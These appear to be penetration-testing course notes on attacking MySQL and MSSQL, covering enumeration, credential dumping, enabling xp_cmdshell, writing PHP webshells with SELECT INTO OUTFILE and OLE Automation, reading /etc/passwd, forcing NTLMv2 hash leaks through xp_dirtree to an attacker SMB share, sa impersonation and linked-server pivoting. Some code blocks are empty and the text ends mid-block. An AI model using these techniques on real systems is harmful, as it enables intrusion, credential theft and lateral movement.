# 🗄️ 1. Attacking SQL Databases

> [!info]  
> **MySQL** and **Microsoft SQL Server (MSSQL)** are relational database management systems (RDBMS) that store data in **tables, columns, and rows**.
> 
> SQL databases are high-value penetration-testing targets because they commonly contain:
> 
> - 👤 User credentials
>     
> - 🪪 Personally Identifiable Information (**PII**)
>     
> - 💼 Business data
>     
> - 💳 Payment information
>     
> - ⚙️ Configuration data
>     
> - 🔑 Authentication tokens
>     
> 
> Database services may also run with **highly privileged accounts**, meaning database access can potentially become a path to:
> 
> - Privilege escalation
>     
> - Command execution
>     
> - Credential theft
>     
> - Lateral movement
>     
> - Access to other networks/databases
>     

---

# 🔎 2. Enumeration

## 🌐 Default Database Ports

|Database|Default Port|Protocol / Notes|
|---|--:|---|
|**MSSQL**|`1433/TCP`|Default SQL Server port|
|**MSSQL**|`1434/UDP`|SQL Server Browser|
|**MSSQL hidden mode**|`2433/TCP`|May be used when MSSQL operates in hidden mode|
|**MySQL**|`3306/TCP`|Default MySQL port|

### 🧠 Mental Model

```text
              SQL DATABASE
                   │
          ┌────────┴────────┐
          ▼                 ▼
       MSSQL              MySQL
      1433/TCP           3306/TCP
      1434/UDP
      2433/TCP
          │
          ▼
   🔎 Version / Hostname
          │
          ▼
   🔐 Authentication
          │
          ▼
   🗄️ Databases / Tables
          │
          ▼
   💎 Sensitive Data
          │
          ▼
   ⚡ Privileged Actions
```

---

## 🛰️ Nmap Enumeration

Use Nmap's default scripts and version detection to identify database services:

```bash
nmap -Pn -sV -sC -p1433 10.10.10.125
```

### Important options

- `-Pn` → Skip host discovery and treat the host as up.
    
- `-sV` → Detect service/version information.
    
- `-sC` → Run Nmap's default scripts.
    
- `-p1433` → Scan MSSQL's TCP port.
    

### Example output

```text
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|   Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
|_ssl-date: 2021-08-26T01:11:58+00:00
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

> [!important]  
> **Do not treat database enumeration as simply "find the port."**
> 
> Version, hostname, domain, SQL Server edition, and other information can reveal:
> 
> - Potential vulnerabilities
>     
> - Authentication configuration
>     
> - Domain relationships
>     
> - Possible attack paths
>     
> - Useful targets for further enumeration
>     

---

# 🔐 3. Authentication Mechanisms

## 🪟 MSSQL Authentication

MSSQL supports two primary authentication modes:

|**Authentication TypeDescription**||
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|

### 🧠 Key Difference

```text
Windows Authentication
        │
        └──► Windows / Active Directory identity
                    │
                    ▼
               MSSQL access

Mixed Mode
        │
        ├──► Windows / AD accounts
        │
        └──► SQL Server username/password
```

---

## 🐬 MySQL Authentication

MySQL supports multiple authentication mechanisms, including:

- Username/password authentication
    
- Windows authentication through a required plugin
    

The authentication method chosen by administrators can depend on:

- Compatibility
    
- Security
    
- Usability
    
- Existing infrastructure
    

Misconfiguration of these mechanisms can create attack opportunities.

---

## ⚠️ Historical MySQL Authentication Bypass — CVE-2012-2122

Older MySQL versions, including **MySQL 5.6.x**, were affected by **CVE-2012-2122**, which involved an authentication comparison flaw.

The attack repeatedly attempted authentication using a valid username and the same incorrect password.

```text
Valid Username
      │
      ▼
Repeated incorrect-password attempts
      │
      ▼
Authentication comparison bug
      │
      ▼
Occasional incorrect acceptance
      │
      ▼
Potential authentication bypass
```

The vulnerability was related to the way MySQL handled authentication attempts.

> [!warning]  
> This is a **historical vulnerability** associated with affected MySQL versions. Do not assume modern MySQL installations are vulnerable merely because MySQL is detected.

---

# 🚪 4. MSSQL Authentication Misconfigurations

Misconfigured authentication may allow database access without knowing legitimate credentials.

Potential conditions include:

- Anonymous access enabled
    
- User account with no password
    
- User, group, or machine explicitly allowed to access SQL Server
    

### 🧠 Pentesting Question

When you find MSSQL, ask:

```text
Can I authenticate?
      │
      ├── No
      │    ├── Anonymous?
      │    ├── Default/blank credentials?
      │    ├── Credential reuse?
      │    └── Password attacks?
      │
      └── Yes
           │
           ▼
      What privileges do I have?
```

---

# 👑 5. Why Database Privileges Matter

Once authenticated, **the username alone is not enough**.

The critical question is:

> **What can this account actually do?**

Depending on privileges, a SQL Server account may potentially:

|Capability|Potential Impact|
|---|---|
|Read database contents|Obtain credentials, PII, business data|
|Modify database contents|Alter application data/configuration|
|Change server configuration|Enable dangerous functionality|
|Execute commands|OS-level command execution|
|Read local files|Credential/configuration discovery|
|Communicate with other databases|Lateral movement|
|Capture local system hash|Credential theft|
|Impersonate users|Privilege escalation|
|Access other networks|Network pivot/lateral movement|

> [!important]  
> **Database access can be the beginning of the attack, not the end goal.**
> 
> The objective is often to turn:
> 
> `Database Access → Data → Credentials/Privileges → OS Access → Lateral Movement`

---

# 🗃️ 6. Connecting to SQL Databases

Once credentials are obtained, choose the appropriate client.

## 🐬 MySQL

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

Example:

```text
Welcome to the MariaDB monitor.
Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

MySQL [(none)]>
```

### Important syntax

```text
-u julio
```

→ Username.

```text
-pPassword123
```

→ Password.

```text
-h 10.129.20.13
```

→ Target database server.

> [!tip]  
> Normally, avoid putting passwords directly on the command line when possible because command-line arguments may be exposed through process listings or shell history. The source example uses it for demonstration.

---

# 🪟 7. Connecting to MSSQL with `sqlcmd`

From Windows:

```cmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

Example:

```text
1>
```

### Output formatting options

- `-y` → `SQLCMDMAXVARTYPEWIDTH`
    
- `-Y` → `SQLCMDMAXFIXEDTYPEWIDTH`
    

These can make output easier to read.

> [!warning]  
> The `-y` and `-Y` settings can affect performance.

---

# 🐧 8. Connecting to MSSQL from Linux with `sqsh`

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

Example:

```text
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
...
1>
```

The `-h` option disables headers and footers for cleaner output.

---

# 🧰 9. Connecting with (Impacket) `mssqlclient.py`
```shell
impacket-mssqlclient fiona@10.129.203.10 -windows-auth
```

Another useful option from Linux is Impacket's MSSQL client:

```bash
mssqlclient.py -p 1433 julio@10.129.203.7
```

Example:

```text
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
[!] Press help for extra shell commands
SQL>
```

### 🧠 Client Selection

|Situation|Tool|
|---|---|
|MySQL database|`mysql`|
|MSSQL from Windows|`sqlcmd`|
|MSSQL from Linux|`sqsh`|
|MSSQL + Impacket workflow|`mssqlclient.py`|

---

# 🪟 10. Windows Authentication with MSSQL

When using Windows Authentication, specify the **domain or hostname**.

If no domain/hostname is specified, the client assumes SQL Authentication and authenticates against SQL Server users.

For a local Windows account:

```bash
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

You can also use:

```text
SERVERNAME\accountname
```

or:

```text
.\accountname
```

### 🧠 Mental Model

```text
-U julio
    │
    └──► SQL Authentication

-U DOMAIN\julio
    │
    └──► Windows / AD Authentication

-U SERVERNAME\julio
    │
    └──► Windows / local authentication context
```

---

# 🗄️ 11. SQL Default Databases

Before querying application data, understand the system databases.

> [!info]  
> System databases contain metadata and information required by the database engine. They are useful for enumeration, although they generally do **not** contain the company's application data.

## 🐬 MySQL Default System Databases

- `mysql` — System database containing tables required by the MySQL server.
    
- `information_schema` — Provides access to database metadata.
    
- `performance_schema` — Provides low-level monitoring information.
    
- `sys` — Objects that help DBAs/developers interpret Performance Schema data.
    

## 🪟 MSSQL Default System Databases

- `master` — Keeps information for an instance of SQL Server.
    
- `msdb` — Used by SQL Server Agent.
    
- `model` — Template database copied for each new database.
    
- `resource` — Read-only database containing system objects visible through the `sys` schema.
    
- `tempdb` — Stores temporary objects for SQL queries.
    

> [!warning]  
> You will receive an error if you attempt to list or connect to a database for which your account does not have the required permissions.

---

# 🔎 12. SQL Enumeration Workflow

Once connected:

```text
🗄️ Connect
   ↓
📚 Enumerate Databases
   ↓
📋 Enumerate Tables
   ↓
🧱 Enumerate Columns / Structure
   ↓
🔍 Identify Interesting Tables
   ↓
💎 Extract Sensitive Data
   ↓
🔑 Reuse Credentials / Tokens
   ↓
⚡ Look for Privileged Functionality
```

The important mindset is **not**:

> "Dump everything."

Instead:

> **Find the tables most likely to advance the attack.**

Potentially interesting data includes:

- Usernames
    
- Passwords
    
- API keys
    
- Tokens
    
- Configuration
    
- Connection strings
    
- Service credentials
    

---

# 📚 13. SQL Syntax — Enumerating Databases

## 🐬 MySQL — Show Databases

```sql
SHOW DATABASES;
```

Example:

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

---

## 🪟 MSSQL — Show Databases

```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

Example:

```text
name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

> [!important]  
> With `sqlcmd`, use `GO` after the query to execute the SQL batch.

---

# 🗂️ 14. Select a Database

## MySQL

```sql
USE htbusers;
```

Output:

```text
Database changed
```

## MSSQL

```sql
USE htbusers
GO
```

Output:

```text
Changed database context to 'htbusers'.
```

---

# 📋 15. Show Tables

## MySQL

```sql
SHOW TABLES;
```

Example:

```text
+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

## MSSQL

```sql
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
```

Example:

```text
table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles
roles_users
settings
users

(8 rows affected)
```

---

# 👤 16. Extract Data from Interesting Tables

Once an interesting table is identified:

## MySQL

```sql
SELECT * FROM users;
```

Example:

```text
+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

## MSSQL

```sql
SELECT * FROM users
go
```

Example:

```text
id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```

> [!success]  
> **CPTS takeaway:** When SQL access is obtained, immediately think about **credential reuse**. A database password may work against SMB, WinRM, SSH, RDP, web applications, or other database services.

---

# ⚡ 17. MSSQL Command Execution

## 🧨 `xp_cmdshell`

One of the most important MSSQL features from a penetration-testing perspective is:

```text
xp_cmdshell
```

It allows SQL Server to execute operating-system commands.

### Key properties

- Powerful feature.
    
- Disabled by default.
    
- Can be enabled through configuration.
    
- The spawned Windows process runs with the **security rights of the SQL Server service account**.
    
- Execution is **synchronous** — SQL Server waits for the command to complete before returning control.
    

### Mental Model

```text
MSSQL Login
     │
     ▼
SQL Query
     │
     ▼
xp_cmdshell
     │
     ▼
Windows Process
     │
     ▼
SQL Server Service Account Privileges
     │
     ▼
OS Command Execution
```

> [!important]  
> The privilege of the **SQL Server service account** matters greatly.
> 
> If SQL Server runs under a highly privileged account, `xp_cmdshell` can provide correspondingly powerful OS-level access.

---

## 💻 Execute an OS Command

```sql
xp_cmdshell 'whoami'
GO
```

Example:

```text
output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

This identifies the Windows account executing the command.

---

# 🔓 18. Enable `xp_cmdshell`

If `xp_cmdshell` is disabled, an appropriately privileged account may enable it.

### Step 1 — Allow Advanced Options

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
```

### Step 2 — Apply Configuration

```sql
RECONFIGURE
GO
```

### Step 3 — Enable `xp_cmdshell`

```sql
EXECUTE sp_configure 'xp_cmdshell', 1
GO
```

### Step 4 — Apply Configuration

```sql
RECONFIGURE
GO
```

### Complete Sequence

```sql
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO
```

> [!warning]  
> Enabling `xp_cmdshell` requires appropriate privileges. A normal low-privileged SQL account cannot necessarily enable it.

---

# 🧩 19. Other MSSQL Command-Execution Mechanisms

The source also identifies other possible execution mechanisms:

- Extended stored procedures
    
- CLR Assemblies
    
- SQL Server Agent Jobs
    
- External scripts
    
- `xp_regwrite`
    

`xp_regwrite` can be used to create Windows Registry entries and may potentially be involved in privilege escalation.

> [!info]  
> These mechanisms are outside the main scope here, but they are worth recognizing during enumeration because `xp_cmdshell` is **not the only possible route from SQL access to OS-level execution**.

---

# 🐬 20. MySQL Command Execution Through User-Defined Functions

MySQL does not provide an equivalent built-in `xp_cmdshell`.

However, MySQL supports **User Defined Functions (UDFs)**, which can allow C/C++ code to execute as a SQL function.

Conceptually:

```text
MySQL
  │
  ▼
User Defined Function
  │
  ▼
Native C/C++ code
  │
  ▼
Potential OS command execution
```

> [!warning]  
> The source notes that command-execution UDFs are uncommon in normal production environments, but they are worth being aware of during penetration testing.

---

# 📝 21. Write Local Files

Another important SQL-to-OS attack path is **file writing**.

The basic concept is:

```text
SQL Database
     │
     ▼
Write file to disk
     │
     ▼
File placed in executable/consumed location
     │
     ▼
Application interprets file
     │
     ▼
Potential code execution
```

---

# 🐬 22. MySQL — `SELECT INTO OUTFILE`

MySQL can write query output to a file using:

```sql
SELECT ... INTO OUTFILE
```

If MySQL is running on a PHP-based web server and the database account has appropriate privileges, a file could potentially be written into the web root.

Example:

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

The important attack chain is:

```text
MySQL FILE privilege
       ↓
SELECT INTO OUTFILE
       ↓
Write file into web directory
       ↓
Web server processes file
       ↓
Potential command execution
```

> [!important]  
> **Arbitrary file write does not automatically equal RCE.**
> 
> You need a useful destination and an application/service that will consume or execute the written file.

---

# 🔐 23. MySQL `FILE` Privilege & `secure_file_priv`

MySQL controls file import/export behavior through:

```text
secure_file_priv
```

This affects operations such as:

- `LOAD DATA`
    
- `SELECT ... INTO OUTFILE`
    
- `LOAD_FILE()`
    

These operations also require the appropriate **`FILE` privilege**.

### `secure_file_priv` states

|Value|Meaning|
|---|---|
|Empty|No restriction from `secure_file_priv`; not a secure setting|
|Directory path|File operations are restricted to that directory|
|`NULL`|File import/export operations are disabled|

Check the setting:

```sql
show variables like "secure_file_priv";
```

Example:

```text
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

Here the value is empty, meaning the variable imposes no directory restriction.

> [!tip]  
> When investigating MySQL file-read/write capabilities, check **both**:
> 
> `FILE privilege` + `secure_file_priv`
> 
> Having one without the other may still prevent the desired operation.

---

# 🪟 24. MSSQL — Writing Local Files

MSSQL can also write files, but the source demonstrates this using **OLE Automation Procedures**.

This requires appropriate administrative privileges.

## Enable OLE Automation Procedures

```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

---

## 📄 Create a File

```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

### Attack chain

```text
MSSQL
  │
  ▼
OLE Automation
  │
  ▼
FileSystemObject
  │
  ▼
Write file
  │
  ▼
Web root
  │
  ▼
PHP interpreted by web server
  │
  ▼
Potential command execution
```

---

# 📖 25. Read Local Files

SQL access can also become a **local file-discovery primitive**.

---

## 🪟 MSSQL — Read Local Files

MSSQL can use `OPENROWSET` to read files accessible to the SQL Server account.

Example:

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

Example output:

```text
BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# Each entry should be kept on an individual line.
# The IP address should

(1 rows affected)
```

### Mental Model

```text
MSSQL account
     │
     ▼
OPENROWSET
     │
     ▼
OS file
     │
     ▼
Read contents
     │
     ▼
Search for credentials/configuration
```

---

## 🐬 MySQL — `LOAD_FILE()`

MySQL does not normally allow arbitrary file reading by default.

With the appropriate configuration and privileges, however:

```sql
select LOAD_FILE("/etc/passwd");
```

Example:

```text
+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

> [!important]  
> File-read capability is useful for hunting:
> 
> - Configuration files
>     
> - Credentials
>     
> - Application secrets
>     
> - Connection strings
>     
> - SSH keys
>     
> - Service configuration
>     
> - Other sensitive local data
>     

---

# 🧲 26. Capture the MSSQL Service Account Hash

This technique connects SQL Server attacks with **SMB/NTLM credential capture**.

MSSQL has undocumented stored procedures including:

```text
xp_dirtree
xp_subdirs
```

These procedures interact with the filesystem.

If they are pointed toward an attacker-controlled SMB share, the SQL Server may attempt to authenticate to that share using the account running the SQL Server service.

### 🧠 Core Attack Chain

```text
MSSQL Access
     │
     ▼
xp_dirtree / xp_subdirs
     │
     ▼
\\ATTACKER\share
     │
     ▼
SMB authentication
     │
     ▼
NTLMv2 challenge/response
     │
     ▼
Attacker captures hash
     │
     ├───────────────┐
     ▼               ▼
   Crack            Relay
     │               │
     ▼               ▼
Password          Another host
```

> [!important]  
> The captured credential is the **NTLMv2 challenge-response** of the account used by the SQL Server service, not the plaintext password.

---

# 🧲 27. `xp_dirtree` Hash Capture

Start an SMB listener such as Responder or an Impacket SMB server, then execute:

```sql
EXEC master..xp_dirtree '\\10.10.110.17\share\'
GO
```

Example query output:

```text
subdirectory    depth
--------------- -----------
```

The important event occurs on the attacker's SMB listener.

---

# 🧲 28. `xp_subdirs` Hash Capture

Alternatively:

```sql
EXEC master..xp_subdirs '\\10.10.110.17\share\'
GO
```

Example:

```text
HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*':
FindFirstFile() returned error 5, 'Access is denied.'
```

> [!info]  
> An error on the SQL side does **not necessarily mean the attack failed**.
> 
> The important question is whether the SQL Server attempted SMB authentication to your listener.

---

# 🕵️ 29. Hash Capture with Responder

Start Responder:

```bash
sudo responder -I tun0
```

Example captured authentication:

```text
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:010100000000000000...
```

The useful information includes:

```text
Username
    ↓
demouser

Domain/Host
    ↓
WIN7BOX

Authentication material
    ↓
NTLMv2 challenge-response
```

---

# 🖥️ 30. Hash Capture with Impacket SMB Server

Start an SMB server:

```bash
sudo impacket-smbserver share ./ -smb2support
```

Example:

```text
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:010100000000000000...
[*] Closing down connection
```

> [!success]  
> **CPTS connection:** This is the same fundamental concept used when attacking SMB authentication:
> 
> `Force SMB connection → Capture NTLMv2 → Crack or relay`

---

# 👤 31. MSSQL `IMPERSONATE` Privilege

MSSQL provides an `IMPERSONATE` permission.

It allows a user to execute operations using the permissions of another login until the context is reverted or the session ends.

### 🧠 Mental Model

```text
Low-privileged SQL User
          │
          ▼
   IMPERSONATE permission
          │
          ▼
   EXECUTE AS LOGIN
          │
          ▼
   Higher-privileged login
          │
          ▼
 Privileged SQL operations
```

---

# 🔎 32. Identify Users We Can Impersonate

Use:

```sql
SELECT grantee.name AS [Impersonator], target.name AS [ImpersonatedLogin], p.state_desc FROM sys.server_permissions AS p INNER JOIN sys.server_principals AS grantee ON p.grantee_principal_id = grantee.principal_id INNER JOIN sys.server_principals AS target ON p.major_id = target.principal_id WHERE p.permission_name = 'IMPERSONATE' AND p.class = 101;

```

Example:

```text
name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Potentially interesting result:

```text
sa
```

because `sa` is the SQL Server system administrator account.

---

# 🧑‍💻 33. Check Current User and Role

Before attempting privilege escalation, determine the current context:

```sql
```

```
```

Example:

```text
-----------
julio

(1 rows affected)

-----------
          0

(1 rows affected)
```

Interpretation:

```text
SYSTEM_USER = julio
IS_SRVROLEMEMBER('sysadmin') = 0
```

Therefore:

```text
Current user ≠ sysadmin
```

---

# 👑 34. Impersonate `sa`

If we have permission to impersonate `sa`:

```sql
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Example:

```text
-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

Now:

```text
SYSTEM_USER = sa
sysadmin = 1
```

The SQL session is operating under the impersonated context.

---

## 🔄 35. Revert Impersonation

Return to the original security context with:

```sql
REVERT
```

### Recommended Workflow

```text
SELECT SYSTEM_USER
        │
        ▼
Check sysadmin
        │
        ▼
Find IMPERSONATE permissions
        │
        ▼
Identify privileged login
        │
        ▼
USE master
        │
        ▼
EXECUTE AS LOGIN = 'target'
        │
        ▼
Verify SYSTEM_USER / sysadmin
        │
        ▼
Perform authorized actions
        │
        ▼
REVERT
```

> [!tip]  
> It is recommended to perform `EXECUTE AS LOGIN` from the `master` database because users generally have access to it. Otherwise, impersonating a login that cannot access your current database may result in an error.

> [!important]  
> A user who is not `sysadmin` may still have useful access to:
> 
> - Other databases
>     
> - Linked servers
>     
> - Other SQL functionality
>     
> 
> Therefore, **not being sysadmin does not mean the account is useless**.

---

# 🔗 36. MSSQL Linked Servers

MSSQL supports **linked servers**.

A linked server allows one SQL Server instance to execute queries against another SQL Server instance or another database product.

### Why this matters

```text
Current MSSQL Server
        │
        ▼
Linked Server
        │
        ▼
Remote SQL Server
        │
        ▼
Remote Account Privileges
        │
        ├── Read databases
        ├── Execute queries
        └── Potentially execute OS commands
```

If the credentials configured for the linked server have **sysadmin privileges**, this can become a powerful lateral-movement path.

---

# 🔎 37. Identify Linked Servers

```sql
SELECT srvname, isremote FROM sysservers
GO
```

Example:

```text
srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

### Understanding `isremote`

```text
isremote = 1
    ↓
Remote server

isremote = 0
    ↓
Linked server
```

> [!important]  
> Do not stop after discovering a linked server.
> 
> The next question is:
> 
> **"Which account does the linked connection use, and what privileges does that account have?"**

---

# 🧪 38. Execute Queries on a Linked Server

Use `EXECUTE ... AT`:

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```

Example:

```text
------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

This reveals information about the remote SQL Server and the security context being used.

The important result here is:

```text
system_user = sa_remote
sysadmin = 1
```

Therefore, the linked connection has administrative privileges on the remote SQL Server.

---

# 📝 39. Quoting Linked-Server Queries

When the query contains single quotes, they need to be escaped.

Example:

```sql
is_srvrolemember(''sysadmin'')
```

instead of:

```sql
is_srvrolemember('sysadmin')
```

Multiple commands can be separated with:

```text
;
```

### Example Structure

```text
EXECUTE(
    'command1;
     command2;
     command3'
) AT [LINKED_SERVER]
```

---

# ⚡ 40. Linked Server → Command Execution

If the remote linked-server account has `sysadmin` privileges:

```text
Current SQL Server
       │
       ▼
Discover linked server
       │
       ▼
Query remote server
       │
       ▼
Identify remote security context
       │
       ▼
Remote account = sysadmin
       │
       ▼
Control remote SQL Server
       │
       ├──► Read remote databases
       │
       └──► Potentially use xp_cmdshell
                    │
                    ▼
              Remote OS execution
```

This makes linked servers a potential **lateral movement mechanism**.

---

# 🧠 41. Complete SQL Attack Methodology

```text
                 🗄️ SQL SERVICE FOUND
                         │
                         ▼
                 🔎 ENUMERATE
                Version / Hostname
                         │
                         ▼
                 🔐 AUTHENTICATE
                         │
          ┌──────────────┼──────────────┐
          ▼              ▼              ▼
      Anonymous      Credentials    Password Attack
          │              │              │
          └──────────────┼──────────────┘
                         ▼
                   🗄️ SQL ACCESS
                         │
                         ▼
              📚 ENUMERATE DATABASES
                         │
                         ▼
                 📋 ENUMERATE TABLES
                         │
                         ▼
              💎 FIND SENSITIVE DATA
                         │
               ┌─────────┼─────────┐
               ▼         ▼         ▼
           Credentials Tokens   Configs
               │         │         │
               └─────────┼─────────┘
                         ▼
                🔐 REUSE CREDENTIALS
                         │
                         ▼
               🧑‍💻 CHECK PRIVILEGES
                         │
        ┌────────────────┼────────────────┐
        ▼                ▼                ▼
   MSSQL               MySQL         Linked Servers
        │
        ├──► xp_cmdshell
        │
        ├──► IMPERSONATE
        │
        ├──► File Read
        │
        ├──► File Write
        │
        └──► xp_dirtree / xp_subdirs
                    │
                    ▼
              🧲 NTLMv2 Capture
                    │
               ┌────┴────┐
               ▼         ▼
             Crack      Relay
               │         │
               └────┬────┘
                    ▼
             🔓 Further Access
```

---

# 🎯 42. When to Use What

|Situation|Technique / Tool|Goal|
|---|---|---|
|SQL port discovered|`nmap -sC -sV`|Identify database/version|
|Need to connect to MySQL|`mysql`|Authenticate/query|
|MSSQL from Windows|`sqlcmd`|Authenticate/query|
|MSSQL from Linux|`sqsh`|Authenticate/query|
|MSSQL + Impacket workflow|`mssqlclient.py`|Authenticate/query|
|Need database names|`SHOW DATABASES` / `sysdatabases`|Database enumeration|
|Need tables|`SHOW TABLES` / `INFORMATION_SCHEMA.TABLES`|Table enumeration|
|Looking for credentials|Query interesting tables|Credential discovery|
|MSSQL command execution|`xp_cmdshell`|Execute OS commands|
|`xp_cmdshell` disabled|`sp_configure`|Enable if sufficiently privileged|
|MySQL command execution|UDF|Potential native code execution|
|MySQL file writing|`SELECT INTO OUTFILE`|Write local files|
|MySQL file access|`LOAD_FILE()`|Read local files|
|MSSQL file writing|OLE Automation|Write local files|
|MSSQL file reading|`OPENROWSET`|Read local files|
|Capture SQL service account hash|`xp_dirtree` / `xp_subdirs`|Trigger SMB authentication|
|Receive NTLMv2|Responder / Impacket SMB server|Capture challenge-response|
|SQL privilege escalation|`IMPERSONATE`|Assume another SQL login|
|Need remote SQL access|Linked servers|Lateral movement|
|Linked server has sysadmin|`EXECUTE ... AT`|Execute privileged remote SQL queries|

---

# 🧠 43. SQL Database Attack Decision Tree

```text
🗄️ SQL FOUND
    │
    ▼
🔎 Which DB?
    │
    ├── MySQL
    │     │
    │     ├── 3306?
    │     ├── Authenticate
    │     ├── Enumerate DBs/tables
    │     ├── Search credentials
    │     ├── Check FILE privilege
    │     ├── Check secure_file_priv
    │     ├── LOAD_FILE()
    │     └── SELECT INTO OUTFILE
    │
    └── MSSQL
          │
          ├── 1433 / 2433?
          ├── Authenticate
          ├── Windows or SQL auth?
          ├── Enumerate DBs/tables
          ├── Check sysadmin
          ├── Check IMPERSONATE
          ├── Check linked servers
          ├── Check xp_cmdshell
          ├── File read/write
          └── xp_dirtree / xp_subdirs
                    │
                    ▼
               NTLMv2 capture
                    │
              ┌─────┴─────┐
              ▼           ▼
            Crack       Relay
```

---

# 🧠 44. The Most Important Mental Model

> [!important]  
> Think of a SQL server as **both a database and a potential bridge to the operating system and other systems**.

```text
